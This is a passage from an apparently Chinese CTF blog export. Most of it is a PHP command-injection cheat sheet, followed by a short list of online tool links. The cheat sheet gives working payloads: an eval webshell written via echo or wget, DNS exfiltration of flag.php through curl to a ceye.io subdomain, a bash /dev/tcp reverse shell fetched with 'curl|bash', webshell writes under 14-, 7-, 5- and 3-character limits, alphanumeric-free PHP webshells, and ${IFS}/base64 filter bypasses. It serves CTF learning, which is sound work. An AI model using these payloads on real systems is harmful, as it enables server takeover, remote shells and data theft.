‘2p’ | cut -b 1   <a href="https://www.programminghunter.com/article/2509882697/">cut用法</a></p></li><li><p>写入webshell<br>直接写入<br>?cmd&#x3D;echo “<?php @eval(\$_POST[abc];?>)” &gt; webshell.php<br>外部下载<br>wget 网址 -O webshell.php   <a href="https://www.cnblogs.com/sx66/p/11887022.html">wget用法</a></p></li><li><p>dns外带(不建议使用)<br>用 &lt; 替代空格，且对输出结果base64编码<br>curl <code>cat&lt;flag.php|base64</code><br>拼接域名后<br>curl <code>cat&lt;flag.php|base64</code>.xxxxxx.ceye.io<br>注意<br>    命令执行要避免空格，空格会导致空格后面的命令不执行；<br>    将读取的文件命令用 &#96;&#96; 包含起来；<br>    拼接的域名有长度限制<br>    base64有 &#x3D; 可能会请求不到</p></li><li><p>反弹shell<br>首先在公网nc监听<br>nc -lvp 4444  或  nc -vv -lp 4444<br>然后在公网写个文件(qwzf文件)，<br>内容是  bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;x.x.x.x&#x2F;4444 0&gt;&amp;1<br>最终浏览器执行payload<br>?cmd&#x3D;curl x.x.x.x:xxxx&#x2F;qwzf|bash</p><h2 id="有限字符下的命令执行"><a href="#有限字符下的命令执行" class="headerlink" title="有限字符下的命令执行"></a>有限字符下的命令执行</h2><h3 id="14位可控"><a href="#14位可控" class="headerlink" title="14位可控"></a>14位可控</h3><p><img src="https://bu.dusays.com/2021/09/13/f5f22a7ff29b1.png" alt="14位可控"><br>只能传入14个字符，但没有限制命令执行的次数，所以我们可以用 &gt; 和 &gt;&gt; 符号写入一句话木马，图有这样是可以运行的，所以构造payload为：<br>echo \&lt;?php&gt;1<br>echo eval\(&gt;&gt;1<br>echo \$_GET&gt;&gt;1<br>echo \[1\]&gt;&gt;1<br>echo \)\;&gt;&gt;1<br>mv 1 1.php</p></li></ul><h3 id="7位可控"><a href="#7位可控" class="headerlink" title="7位可控"></a>7位可控</h3><ul><li><p>知识点<br>&gt;a———————虽然没有输入但是会创建a这个文件<br>ls -t——————ls基于事件排序(从晚到早)<br>sh a——————-sh会把 a 里面的每行内容当命令来执行<br>使用 \ 进行命令拼接—–l\s 等价于 ls</p></li><li><p>payload:<br>&gt;hp&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&gt;dFV\\<br>&gt;1.p\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&gt;kX0\\<br>&gt;d\&gt;\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&gt;bCg\\<br>&gt;\ -\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;XZh\\<br>&gt;e64\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;AgZ\\<br>&gt;bas\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;waH\\<br>&gt;7\|\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&gt;PD9\\<br>&gt;XSk\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;o\ \\<br>&gt;Fsx\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;ech \\<br>&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;ls -t&gt;0<br>&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;sh 0<br>目标写入语句   “&lt;?php eval($_GET[1]);”   base64之后为 PD9waHAgZXZhbCgkX0dFVFsxXSk7</p><p>需要执行的语句是  “echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php”</p></li></ul><h3 id="5位可控"><a href="#5位可控" class="headerlink" title="5位可控"></a>5位可控</h3><ul><li><p>知识点<br>输入通配符 * ，Linux会把第一个列出来的文件名当作参数<br>​    通过 rev 来倒置输出内容(rev命令将文件的每行内容以字符为单位反序输出)</p><p>​    用 dir 来代替 ls 不换行输出；rev将文件内容反向输出；在用ls时，写到a文件时每个文件名都是单独的一行</p><p>​    &gt;rev<br>​    echo 1234&gt;v<br>​    *v 等价于 rev v</p></li><li><p>payload：<br>&gt;dir&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;se\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&gt;h\\<br>&gt;f\&gt;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&gt;ba\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&gt;XZ\\<br>&gt;ht-&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&gt;\|\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;gZ\\<br>&gt;sl&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;7\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;A\\<br>*&gt;v&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;Sk\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&gt;aH\\<br>&gt;rev&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&gt;X\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;w\\<br>*v&gt;a&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&gt;x\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;D9\\<br>&gt;hp&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&gt;Fs\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;P\\<br>&gt;p\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&gt;FV\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&gt;S}\\<br>&gt;1.\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&gt;d\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;IF\\<br>&gt;\&gt;\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&gt;X0\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;{\\<br>&gt;-d\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&gt;k\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;\$\\<br>&gt;\ \\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&gt;g\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;o\\<br>&gt;64\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;bC\\&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;ch\\<br>&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&gt;e\\<br>&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;sh a<br>&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;sh f</p></li><li><p>3位可控<br>paylaod:<br>&gt;nl<br>*&gt;z<br>最后访问文件z  <a href="http://url/z">http://url/z</a><br>根目录下有两个文件：新建的nl和当前的xxx.php<br>*号代表字符串nl xxx.php，将当前目录下所有文件的名字列出来，(试试echo *就知道了<br>将其写入一个空文件z<br>访问该文件就会自动执行字符串nl xxx.php</p></li></ul><h2 id="无字母数字webshell"><a href="#无字母数字webshell" class="headerlink" title="无字母数字webshell"></a>无字母数字webshell</h2><h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><p>​    通过非字母数字进行异或，得到所需字母</p><h3 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h3><ul><li>字符串取反<br><img src="https://bu.dusays.com/2021/09/14/f363ee1963482.png" alt="知识点"></li><li>利用汉字构造异或，得到所需字母</li></ul><table>    <tr>        <td ><center><img src="https://bu.dusays.com/2021/09/14/f7e0a5e171c2a.png" >知识点 </center></td>        <td ><center><img src="https://bu.dusays.com/2021/09/14/169db5e42f69e.png"  >脚本</center></td>    </tr></table><h3 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h3><p>如果我们想构造任意的函数（函数、方法不区分大小写）的话，我们得从A开始，才能构造任意字符，拼接成函数</p><p>数组(Array)的第一个字母是A，在php中，如果强制连接数组和字符串的话，数组会转换成字符串，值为Array；</p><pre class=" language-php"><code class="language-php"><span class="token keyword">echo</span> <span class="token string">''</span><span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token shell-comment comment">#Array</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$_</span><span class="token punctuation">[</span><span class="token string">'!'</span><span class="token operator">==</span><span class="token string">'@'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token shell-comment comment">#A</span></code></pre><p>如果自增有字符数限制的话，可以用到PHP中的NAN和INF：</p><blockquote><p>NaN（Not a Number，非数）是计算机科学中数值数据类型的一类值，表示未定义或不可表示的值。常在浮点数运算中使用。首次引入NaN的是1985年的IEEE 754浮点数标准。</p><p>INF：infinite，表示“无穷大”。 超出浮点数的表示范围（溢出，即阶码部分超过其能表示的最大值）。</p></blockquote><p>这样不用通过从A自增到N，可以减少很多的长度。</p><p>接下来就是想办法构造_GET，慢慢自增来拿到字母，然后拼接：</p><pre class=" language-php"><code class="language-php"><span class="token variable">$_</span><span class="token operator">=</span>C<span class="token punctuation">;</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$C</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">(</span>C<span class="token operator">/</span>C<span class="token punctuation">.</span>C<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span>_<span class="token punctuation">.</span><span class="token variable">$__</span><span class="token punctuation">.</span><span class="token variable">$C</span><span class="token punctuation">.</span><span class="token variable">$_</span><span class="token punctuation">;</span>$<span class="token variable">$_</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">(</span>$<span class="token variable">$_</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  相当于  <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>     数字被过滤的话，换成下划线就行，或者用上面的方法来取<span class="token number">0</span>，<span class="token number">1</span></code></pre><h3 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h3><p>使用 &#96; + shell  的方式来getshell</p><p>shell下可以用 . 来执行任意脚本</p><p>Linux下支持glob通配符代替 . 或者叫 period，它的作用和source一样，就是用当前的shell执行一个文件中的命令，例如 .file 就是执行file文件中的命令</p><p>glob通配符<br>*代替0个以上的任意字符<br>?代替1个任意字符<br>用[^x]来表示 这个位置不是字符x<br>[0-9]来表示一位数<br>更多glob内容可看：<a href="https://man7.org/linux/man-pages/man7/glob.7.html">https://man7.org/linux/man-pages/man7/glob.7.html</a><br>例题<br><img src="https://bu.dusays.com/2021/09/14/0a5bd992c836f.png" alt="津门杯.png"></p><p>payload：?code&#x3D;?&gt;<?=`/???/??? /????`?></p><h2 id="命令执行绕过"><a href="#命令执行绕过" class="headerlink" title="命令执行绕过"></a>命令执行绕过</h2><h3 id="常用linux命令"><a href="#常用linux命令" class="headerlink" title="常用linux命令"></a>常用linux命令</h3><p>这里介绍一些常用的，更多命令请前往：<a href="https://deepinout.com/linux-cmd">https://deepinout.com/linux-cmd</a></p><ul><li><p>查看文件<br>cat、tac、nl、more、less、head、tail、tailf、od、sort、rev、strings、cut</p></li><li><p>查找文件<br>find . -name “fla”<br>​    <a href="https://deepinout.com/linux-cmd/linux-string-file-cmd-search-cmd/linux-cmd-locate.html">locate</a> fla*    locate命令无需指定路径，而是在一个 mlocate.db 的数据库下搜索。这个数据库位于 &#x2F;var&#x2F;lib&#x2F;mlocate&#x2F;mlocate.db ,它包含了系统里所有文件的索引，并会每天由 corn 工具自动更新一次，可以 sudo updadb 更新其数据库</p><p>​    <a href="https://deepinout.com/linux-cmd/linux-string-file-cmd-search-cmd/linux-cmd-which.html">which</a>    命令主要用来查找可执行文件(也就是命令)的位置</p><p>​    <a href="https://deepinout.com/linux-cmd/linux-string-file-cmd-search-cmd/linux-cmd-whereis.html">whereis</a>   命令会在系统默认安装目录(一般是有root权限时默认安装的软件)查找二进制文件、源码、文档中包含给定查询关键词的文件</p></li><li><p>查找文件内容</p><p>​    grep -ar fla* &#x2F;      -a不忽略二进制文件</p></li><li><p>文件传输</p><p>​    curl   利用curl下载文件</p></li></ul><pre class=" language-shell"><code class="language-shell">curl -o dodo1.jpg http://url/dodo1.jpg    #使用内置option：-o(小写)curl -O http://url/dodo1.jpg       #使用内置option：-o(大写)</code></pre><ul><li><p>列目录</p><p>​    ls、dir</p></li><li><p>命令分隔符</p><p>​    %0a 换行符</p><p>​    %0d 回车符</p><p>​    ; 执行连续命令</p><p>​    &amp; 不执行错误检查，运行所有命令</p><p>​    &amp;&amp; 前一条命令执行成功才执行后面的命令</p><p>​    || 成功执行一次命令就结束，不管后面还有没有命令</p><p>​    | 符号左边命令的输出作为符号右边的输入，所以左边的输出不显示</p><p>​    %00%20# 命令终止符</p></li></ul><h3 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h3><ul><li><p>${IFS}</p><p>​    payload1: cat${IFS}flag</p><p>​    payload2: cat${IFS}$9flag  $9是当前系统shell进程的第九个参数的持有者，它始终为空字符串。</p><p>​    payload3: cat$IFS$9flag</p></li><li><p>重定向&lt;&gt;<br>payload1: cat&lt;&gt;flag<br>​    payload2: cat&lt;flag</p></li><li><p>%09    需要php环境</p></li><li><p>{cat,flag}  用逗号实现空格功能</p></li></ul><h3 id="黑名单过滤"><a href="#黑名单过滤" class="headerlink" title="黑名单过滤"></a>黑名单过滤</h3><ul><li><p>拼接</p><p>​    d&#x3D;ag;a&#x3D;c;c&#x3D;fl;b&#x3D;at;$a$b $c$d;</p></li><li><p>base64编码</p><p>​    `echo “Y2F0IGZsYWc&#x3D;”|base64 -d`</p><p>​    echo “Y2F0IGZsYWc&#x3D;”|base64 -d|bash   (bash被过滤可以用sh)</p></li><li><p>单引号、双引号</p><p>​    c””at fl’’ag</p></li><li><p>反斜线</p><p>​    c\at f\lag</p></li><li><p>{}</p><p>​    <code>curl http://example.com/a.p&#123;a..z&#125;p</code>，一般是在命令的参数中使用，命令测试了基本上不行</p></li><li><p>$1、$2等和$@</p><blockquote><p>$# 是传给脚本的参数个数<br>$0 是脚本本身的名字<br>$1 是传递给该shell脚本的第一个参数<br>$2 是传递给该shell脚本的第二个参数<br>$@ 是传给脚本的所有参数的列表<br>$* 是以一个单字符串显示所有向脚本传递的参数，与位置变量不同，参数可超过9个<br>$$ 是脚本运行的当前进程ID号<br>$? 是显示最后命令的退出状态，0表示没有错误，其他表示有错误</p></blockquote></li><li><p>利用环境变量构造命令</p><pre class=" language-text"><code class="language-text">$&#123;PATH&#125;   命令搜寻路径$&#123;PWD&#125;   当前路径$&#123;USER&#125;   当前用户$&#123;PHP&#125;$&#123;PHP_VERSION&#125;   php版本$&#123;SHLVL&#125;深度-SHLVL 是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时$&#123;SHLVL&#125;=1，然后在此shell中再打开一个shell时$SHLVL=2。    $?    执行上一个指令的返回值(0表示没有错误，其他任何值表明有错误)$&#123;RANDOM&#125;   获得(因为具有随机性，所以要多尝试直到随机出4来)大写字母表示倒数开始，A倒数第一位，B倒数第二位......$&#123;PHP_CFLAGS&#125;</code></pre></li><li><p>~$()构造数字</p></li></ul><h3 id="分号过滤"><a href="#分号过滤" class="headerlink" title="分号过滤"></a>分号过滤</h3><p>​      %0a</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
          <category> rce </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在线工具链接</title>
      <link href="/2021/08/24/gong-ju/"/>
      <url>/2021/08/24/gong-ju/</url>
      
        <content type="html"><![CDATA[<h2 id="图床"><a href="#图床" class="headerlink" title="图床"></a>图床</h2><ul><li>晚风：<a href="https://pic.alexhchu.com/">https://pic.alexhchu.com/</a></li><li>去不：<a href="https://7bu.top/">https://7bu.top/</a></li></ul><span id="more"></span><h2 id="编码、解码"><a href="#编码、解码" class="headerlink" title="编码、解码"></a>编码、解码</h2><ul><li>bugku工具：<a href="https://ctf.bugku.com/tools">https://ctf.bugku.com/tools</a></li><li>编码转换：<a href="http://web.chacuo.net/charsetbase64">http://web.chacuo.net/charsetbase64</a></li></ul><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><ul><li>dcode：<a href="https://www.dcode.fr/">https://www.dcode.fr/</a></li><li>PMD5：<a href="https://pmd5.com/">https://pmd5.com/</a></li><li>CMD5：<a href="https://www.cmd5.com/">https://www.cmd5.com/</a></li></ul><h2 id="正则测试"><a href="#正则测试" class="headerlink" title="正则测试"></a>正则测试</h2><ul><li><a href="https://regex101.com/">https://regex101.com/</a></li></ul><h2 id="文件转换"><a href="#文件转换" class="headerlink" title="文件转换"></a>文件转换</h2><ul><li>convertio：<a href="https://convertio.co/zh/">https://convertio.co/zh/</a></li><li>易转换：<a href="https://www.easeconvert.com/">https://www.easeconvert.com/</a></li></ul><h2 id="图片编辑"><a href="#图片编辑" class="headerlink" title="图片编辑"></a>图片编辑</h2><ul><li>稿定设计：<a href="https://www.uupoop.com/">https://www.uupoop.com/</a></li><li>iLoveIMG：<a href="https://www.iloveimg.com/zh-cn">https://www.iloveimg.com/zh-cn</a></li></ul><h2 id="渗透师导航"><a href="#渗透师导航" class="headerlink" title="渗透师导航"></a>渗透师导航</h2><ul><li><a href="https://www.shentoushi.top/network">https://www.shentoushi.top/network</a></li></ul><h2 id="持续更新"><a href="#持续更新" class="headerlink" title="持续更新"></a>持续更新</h2>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
